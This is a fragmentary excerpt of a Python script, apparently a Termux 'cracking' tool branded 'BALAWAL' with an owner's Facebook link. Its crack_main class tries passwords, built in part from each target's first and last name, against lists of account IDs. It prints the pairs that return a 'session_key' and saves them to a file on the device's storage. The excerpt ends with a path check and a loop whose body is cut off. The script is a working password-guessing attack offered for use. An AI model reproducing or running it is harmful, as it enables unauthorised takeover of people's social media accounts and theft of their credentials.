...
$$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |$$$  / \$$$ |$$ |  $$ |$$ |            
$$$$$$$  |$$ |  $$ |$$$$$$$$\ $$ |  $$ |$$  /   \$$ |$$ |  $$ |$$$$$$$$\       
\_______/ \__|  \__|\________|\__|  \__|\__/     \__|\__|  \__|\________|      
...
{50*"-"}
  Owner     :  https://www.facebook.com/balawal.saleem.3
  Tool Version :   3.4
  Thanks Alot  :  Balawal Saleem
{50*"-"}'''
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[BALAWAL ♥] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[BALAWAL ♥-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/BALAWAL ♥_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/BALAWAL ♥_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/BALAWAL ♥' in datar:
        pass
else:
        for i in range(5000):
